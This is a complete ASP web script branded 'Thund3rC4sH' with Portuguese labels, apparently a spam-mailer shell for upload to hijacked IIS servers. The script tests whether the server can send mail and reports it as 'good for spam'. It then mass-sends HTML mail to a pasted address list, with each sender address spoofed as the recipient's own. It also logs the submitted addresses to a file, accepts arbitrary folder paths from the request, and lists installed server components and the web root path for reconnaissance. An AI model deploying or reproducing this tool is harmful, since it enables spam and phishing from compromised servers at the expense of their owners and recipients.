<%
On Error Resume Next
'Server.ScriptTimeOut  = 7200
Server.ScriptTimeOut  = 9999999

	Set Objeto=Server.CreateObject("Scripting.FileSystemObject")
If request("path") <> "" then
	Set ObjPasta = Objeto.GetFolder(request("path"))
Else
	if request("t5") <> "" then
 		Set ObjPasta = Objeto.GetFolder(request("t5"))
	Else 
 		Set ObjPasta = Objeto.GetFolder(server.mappath("."))
	end if 
End If	

If Trim(Request.QueryString("path")) = "" Then
	caminho = Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))
	pos = Instr(caminho,"\")
	pos2 = 1
	While pos2 <> 0
		If Instr(pos + 1,caminho,"\") <> 0 Then
			pos = Instr(pos + 1,caminho,"\")
		Else
			pos2 = 0
		End If
	Wend
	path = Left(caminho,pos)
Else
	path =  trim(Request.QueryString("path")) & "\"
End If
		
pagename = Mid(Request.ServerVariables("SCRIPT_NAME"),InstrRev(Request.ServerVariables("SCRIPT_NAME"),"/")+1,Len(Request.ServerVariables("SCRIPT_NAME")))

Function functionfooter
	response.write ""
	response.write ""
	response.write ""
	response.write ""
	response.write ""
	response.write ""
	response.write ""
End Function
 
%>
<html>

<head>
<title>[!] ----==Thund3rC4sH==-----  [!] </title>
<style>
body{
	scrollbar-arrow-color: #BFBFBF;
	scrollbar-3dlight-color: #FFFFFF;
	scrollbar-highlight-color: #9F9F9F;
	scrollbar-face-color: #FFFFFF;
	scrollbar-shadow-color: #C0C0C0;
	scrollbar-darkshadow-color: #FFFFFF;
	scrollbar-track-color: #C0C0C0;
	background-color: #000000;
}
</style>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"></head>

<body text="#808080" leftMargin="0" topMargin="0">

<center>
<p align="center"><font color="#0000FF"><font face="Tahoma">[--] - SEND TO BY ----==Thund3rC4sH==---- [--] </font></p>
</center>
<div align="center">
  <%
Set objComponente = Server.CreateObject("CDONTS.NewMail")
If Err.Number = 0 Then
            	Response.Write "<br><b><font face='Tahoma' size='2' color='gren'>SERVIDOR BOM PARA SPAMM<BR>"
			Else
            	Response.Write "<br><font face='Tahoma' size='2' color='red'><b>SERVIDOR SEM SUPORTE PARA SPAAM<BR>"
End If
Err.Clear

if request("botao") = "enviar" then

	'EMAILS
	Set fsoObjeto = Server.CreateObject("Scripting.FileSystemObject")
	Set ObjAbreArq = fsoObjeto.OpenTextFile(ObjPasta & "\tmp.txt", 8, True, False)
	ObjAbreArq.writeline request("to")

	'Abre o arquivo txt com os e-mails	
 	'Do While Not ObjAbreArq.AtEndOfStream
	'fsoMostraConteudo = nothing
	'fsoMostraConteudo = ObjAbreArq.ReadLine
	'call SenDMaiL(fsoMostraConteudo)
	'Loop
   ' ObjAbreArq.Close
    'fsoObjeto.close
	'Set ObjAbreArq = Nothing
	'Set fsoObjeto  = Nothing

 	vetordelinhas = Split(Request.Form("to"),chr(13))

	For i = 0 To UBound(vetordelinhas)
		Err.Clear
		Set msg = Server.CreateObject("CDONTS.NewMail")
		msg.BodyFormat=0
                msg.MailFormat=0
                msg.Importance=1
                'msg.From=request("remetente")
				msg.From=vetordelinhas(i)
                msg.To=vetordelinhas(i)
                msg.Subject=request("subject")
                msg.Body=request("body")
                msg.Send
        	If Err.Number = 0 Then
            	Response.Write "<br><b><font face='Tahoma' size='2' color='gren'>Enviado Para: " & vetordelinhas(i)
			Else
            	Response.Write "<br><font face='Tahoma' size='2' color='red'><b>FaLhOu EM: " & vetordelinhas(i) & " - ERRO: " & Err.Description
			End If
		Set MyMail = Nothing
	Next

end if

%> </font>
  
</div>
<form method="POST" action="<%=pagename%>">
  <div align="center">
    <table border="0" width="43%" height="434">
      <tr>
        <td width="13%" height="43" bordercolor="#000000" bgcolor="#000000">
        <font color="#0000FF"><strong>Remetente:</strong></font></td>
    <td width="87%" height="43" bordercolor="#000000" bgcolor="#000000">
      <font color="#0000FF">
      <input type="text" name="remetente" size="72" style="font-size: 8pt; border: 1px solid #000080; background-color: #666666"></font></td>
    </tr>
      <tr>
        <td width="13%" height="43" bordercolor="#000000" bgcolor="#000000">
        <font color="#0000FF"><strong>Assunto:</strong></font></td>
    <td width="87%" height="43" bordercolor="#000000" bgcolor="#000000">
      <font color="#0000FF">
      <input type="text" name="subject" size="71" style="font-size: 8pt; border: 1px solid #000080; background-color: #666666"></font></td>
    </tr>
      <tr>
        <td width="13%" height="170" bordercolor="#000000" bgcolor="#000000">
        <font color="#0000FF"><strong>Mensagem<br>
          (HTML):</strong></font></td>
    <td width="87%" height="170" bordercolor="#000000" bgcolor="#000000">
      <p>
        <font color="#0000FF">
        <textarea rows="12" name="body" cols="69" style="font-family: Tahoma; font-size: 8pt; border: 1px solid #000080; background-color: #C0C0C0"></textarea>
        </font>
      </p>
      <p><span style="margin: 3"><p style="margin: 3" id="bytesmail">
          </tr>
      <tr>
        <td width="13%" height="164" bordercolor="#000000" bgcolor="#000000">
        <font color="#0000FF"><strong>Lista De E-mails:</strong></font></td>
    <td width="87%" height="164" bordercolor="#000000" bgcolor="#000000">
      <font color="#0000FF">
      <textarea type="text" name="to" rows="15" cols="69"style="font-family: Tahoma; font-size: 8pt; border: 1px solid #000080; background-color: #C0C0C0"></textarea></font></td>
    </tr>
      <tr>
        <td width="13%" height="41" bordercolor="#000000" bgcolor="#000000"></td>
    <td width="87%" height="41" bordercolor="#000000" bgcolor="#000000">
      <p align="center"><font color="#0000FF">
      <input type="submit" value="enviar" name="botao" style="font-family: Tahoma; font-size: 8pt; border: 1px solid #000080; background-color: #C0C0C0; float:center"></font></td>
    </tr>
    </table>
  </div>
</form>
<div align="center">
  <font color="#0000FF">
  <%

Dim arrListaComponentes(47)
arrListaComponentes(0) = Array( "AB Mailer","ABMailer.Mailman" )
arrListaComponentes(1) = Array( "ABC Upload","ABCUpload4.XForm" )
arrListaComponentes(2) = Array( "ActiveFile","ActiveFile.Post" )
arrListaComponentes(3) = Array( "ActiveX Data Object","ADODB.Connection" )
arrListaComponentes(4) = Array( "Adiscon SimpleMail","ADISCON.SimpleMail.1" )
arrListaComponentes(5) = Array( "ASP DNS", "AspDNS.Lookup" )
arrListaComponentes(6) = Array( "ASP HTTP","AspHTTP.Conn" )
arrListaComponentes(7) = Array( "ASP Image","AspImage.Image" )
arrListaComponentes(8) = Array( "ASP Mail","SMTPsvg.Mailer" )
arrListaComponentes(9) = Array( "ASP NNTP News", "AspNNTP.Conn" )
arrListaComponentes(10) = Array( "ASP POP 3", "POP3svg.Mailer" )
arrListaComponentes(11) = Array( "ASP Simple Upload","ASPSimpleUpload.Upload" )
arrListaComponentes(12) = Array( "ASP Smart Cache","aspSmartCache.SmartCache" )
arrListaComponentes(13) = Array( "ASP Smart Mail","aspSmartMail.SmartMail" )
arrListaComponentes(14) = Array( "ASP Smart Upload","aspSmartUpload.SmartUpload" )
arrListaComponentes(15) = Array( "ASP Tear","SOFTWING.ASPtear" )
arrListaComponentes(16) = Array( "ASP Thumbnailer","ASPThumbnailer.Thumbnail" )
arrListaComponentes(17) = Array( "ASP WhoIs","WhoIs2.WhoIs" )
arrListaComponentes(18) = Array( "ASPSoft NT Object","ASPSoft.NT" )
arrListaComponentes(19) = Array( "ASPSoft Upload","ASPSoft.Upload" )
arrListaComponentes(20) = Array( "CDO NTS","CDONTS.NewMail" )
arrListaComponentes(21) = Array( "Chestysoft Image","csImageFile.Manage" )
arrListaComponentes(22) = Array( "Chestysoft Upload","csASPUpload.Process" )
arrListaComponentes(23) = Array( "Dimac JMail","JMail.Message" )
arrListaComponentes(24) = Array( "Distinct SMTP","DistinctServerSmtp.SmtpCtrl" )
arrListaComponentes(25) = Array( "Dundas Mailer","Dundas.Mailer" )
arrListaComponentes(26) = Array( "Dundas Upload","Dundas.Upload.2" )
arrListaComponentes(27) = Array( "Dundas PieChartServer", "Dundas.ChartServer.2")
arrListaComponentes(28) = Array( "Dundas 2D Chart", "Dundas.ChartServer2D.1")
arrListaComponentes(29) = Array( "Dundas 3D Chart", "Dundas.ChartServer")
arrListaComponentes(30) = Array( "Dynu Encrypt","Dynu.Encrypt" )
arrListaComponentes(31) = Array( "Dynu HTTP","Dynu.HTTP" )
arrListaComponentes(32) = Array( "Dynu Mail","Dynu.Email" )
arrListaComponentes(33) = Array( "Dynu Upload","Dynu.Upload" )
arrListaComponentes(34) = Array( "Dynu WhoIs","Dynu.Whois" )
arrListaComponentes(35) = Array( "Easy Mail","EasyMail.SMTP.5" )
arrListaComponentes(36) = Array( "File System Object","Scripting.FileSystemObject" )
arrListaComponentes(37) = Array( "Ticluse Teknologi HTTP","InteliSource.Online" )
arrListaComponentes(38) = Array( "Last Mod","LastMod.FileObj" )
arrListaComponentes(39) = Array( "Microsoft XML Engine","Microsoft.XMLDOM" )
arrListaComponentes(40) = Array( "Persits ASP JPEG","Persits.Jpeg" )
arrListaComponentes(41) = Array( "Persits ASPEmail","Persits.MailSender" )
arrListaComponentes(42) = Array( "Persits ASPEncrypt","Persits.CryptoManager" )
arrListaComponentes(43) = Array( "Persits File Upload","Persits.Upload.1" )
arrListaComponentes(44) = Array( "SMTP Mailer","SmtpMail.SmtpMail.1" )
arrListaComponentes(45) = Array( "Soft Artisans File Upload","SoftArtisans.FileUp" )
arrListaComponentes(46) = Array( "Image Size", "ImgSize.Check" )
arrListaComponentes(47) = Array( "Microsoft XML HTTP", "Microsoft.XMLHTTP" )

' Rotina que verifica o componente do array é um objeto.
Function VerificaObjeto(pComponente)
Dim objComponente
On Error Resume Next
VerificaObjeto = False
Err.Clear
Set objComponente = Server.CreateObject(pComponente)
If Err = 0 Then VerificaObjeto = True
Set objComponente = Nothing
Err.Clear
End Function

Public Function VerificaComponentes()
Dim intCont, strTxt
Dim intIndex, strProv

intCont = 0
strTxt = "<table border='1' bordercolor='#A00000' cellspacing='0' cellpadding='0' align='center' width='400'>"
For intIndex = LBound(arrListaComponentes) To UBound(arrListaComponentes)
strProv = intIndex
strTxt = strTxt & "<tr><td width='200'><font face='tahoma' size='1'>" & arrListaComponentes(intIndex)(0) & "</font></td>"
If VerificaObjeto(arrListaComponentes(intIndex)(1)) Then
strTxt = strTxt & "<td align=center><font color='red' face='tahoma' size='1'>Instalado</font></td>"
intCont = intCont + 1
Else
strTxt = strTxt & "<td align='center'><font face='tahoma' size='1'>Não Instalado</font></td>"
End If
strTxt = strTxt & "</tr>"
Next
strTxt = strTxt & "</table><p align='center'><font face='tahoma' size='2'><b>" & intCont & "</b> componentes instalados de "
strTxt = strTxt & "<b>" & UBound(arrListaComponentes) + 1 & "</b> no servidor.</font> </p>"
VerificaComponentes = strTxt
End Function

Response.Write "<center><a href='http://www.milw0rm.com'><font size='1' color='660000' face='tahoma'>xD</font></a></p>"
caminho = server.MapPath("\")
response.write "<center><font face='tahoma' size='1'>" & caminho & "</font></center>"

Response.Write VerificaComponentes

Response.Write "<p><center><font face='tahoma' size='1'>&copy; Copyright ----==Thund3rC4sH==----- &reg;</a>. Todos os direitos reservados.</font></center>"

'-------------------------
%> </font>
</div>